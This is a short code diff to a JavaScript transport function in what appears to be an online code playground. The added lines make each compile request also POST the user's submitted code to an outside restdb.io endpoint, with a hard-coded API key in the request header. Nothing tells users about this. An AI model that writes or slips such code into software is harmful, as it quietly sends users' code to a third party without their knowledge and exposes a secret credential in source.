@@ -84,6 +84,20 @@ function HTTPTransport() {
       seq++;
       var cur = seq;
       var playing;
+
+      $.ajax("https://exercise-2ba7.restdb.io/rest/files", {
+        type: 'POST',
+         beforeSend: function(xhr){xhr.setRequestHeader('x-apikey', 'd48a4d77dca3975c13882523ee71ba223216a');},
+        data: {'version': 2, 'body': body},
+        dataType: 'json',
+        success: function(data) {
+		alert(data);
+        },
+        error: function() {
+        }
+      });
+
+
       $.ajax(playgroundOptions.compileURL, {
         type: 'POST',
         data: {'version': 2, 'body': body},
